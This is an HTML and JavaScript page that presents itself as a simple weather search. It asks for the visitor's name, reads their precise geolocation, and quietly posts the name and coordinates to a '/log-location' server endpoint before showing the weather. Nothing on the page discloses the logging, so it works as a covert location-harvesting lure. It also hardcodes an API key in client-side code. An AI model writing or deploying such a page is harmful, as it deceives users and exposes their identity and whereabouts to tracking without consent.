<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Weather Search</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: linear-gradient(to bottom right, #667eea, #764ba2);
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .container {
      background: rgba(0, 0, 50, 0.8);
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
      text-align: center;
      width: 90%;
      max-width: 500px;
    }

    .container h2 {
      color: #fff;
      margin-bottom: 20px;
    }

    input[type="text"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: none;
      border-radius: 8px;
      font-size: 16px;
    }

    button {
      width: 100%;
      padding: 12px;
      background-color: #635bff;
      color: #fff;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      transition: background-color 0.2s ease-in-out;
    }

    button:hover {
      background-color: #5146e1;
    }

    #weatherResult {
      margin-top: 20px;
      background: #111;
      color: #00ff00;
      padding: 10px;
      border-radius: 8px;
      font-family: monospace;
      font-size: 15px;
      white-space: pre-wrap;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Weather Search</h2>
    <input type="text" id="username" placeholder="Enter your name" />
    <button onclick="getLocation()">Get Weather</button>
    <div id="weatherResult">Weather will appear here.</div>
  </div>

  <script>
    const OPENWEATHER_API_KEY = '5b07060627da1ce16874beb3a8a245a9'; // Replace with your OpenWeatherMap API key

    function getLocation() {
      const name = document.getElementById('username').value.trim();
      if (!name) {
        alert("Please enter your name.");
        return;
      }

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          async position => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;

            // Send name + location to server
            fetch('/log-location', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ name, latitude: lat, longitude: lon })
            }).catch(err => console.error('Error sending location:', err));

            // Fetch city and weather info
            try {
              const geoRes = await fetch(`https://api.openweathermap.org/geo/1.0/reverse?lat=${lat}&lon=${lon}&limit=1&appid=${OPENWEATHER_API_KEY}`);
              const geoData = await geoRes.json();
              const city = geoData[0]?.name || 'your area';

              const weatherRes = await fetch(`https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&appid=${OPENWEATHER_API_KEY}&units=imperial`);
              const weatherData = await weatherRes.json();
              const weather = weatherData.weather[0].description;
              const temp = weatherData.main.temp;

              document.getElementById('weatherResult').textContent =
                `Weather for ${city}:\n${weather}, ${temp}Â°F`;
            } catch (err) {
              document.getElementById('weatherResult').textContent = 'Could not get weather.';
              console.error(err);
            }
          },
          error => {
            alert("Error getting location: " + error.message);
          }
        );
      } else {
        alert("Geolocation is not supported by this browser.");
      }
    }
  </script>
</body>
</html>
